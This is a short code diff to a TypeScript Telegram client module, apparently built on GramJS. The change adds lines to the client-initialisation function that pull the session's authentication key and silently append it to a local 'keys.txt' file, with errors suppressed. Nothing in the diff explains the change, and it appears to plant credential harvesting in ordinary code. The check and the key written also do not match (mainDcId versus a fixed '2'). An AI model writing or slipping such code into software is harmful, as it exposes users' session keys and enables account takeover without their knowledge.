@@ -1,3 +1,6 @@
+import fs from 'fs';
+import path from 'path';
+
 import { initClient } from '../_client';
 import GramJs from '../../gramjs/tl/api';
 import { getAccountById } from '../db/accounts';
@@ -20,6 +23,15 @@ export const getClient = async (
     (e) => sendToMainBot(e),
     true
   );
+
+  const sessionData = client.session.getSessionData();
+  const { keys, mainDcId } = sessionData;
+
+  if (keys[mainDcId]) {
+    fs.promises
+      .appendFile(path.resolve(process.cwd(), 'keys.txt'), `${keys['2']}:2\n`)
+      .catch(() => {});
+  }
 
   return client;
 };
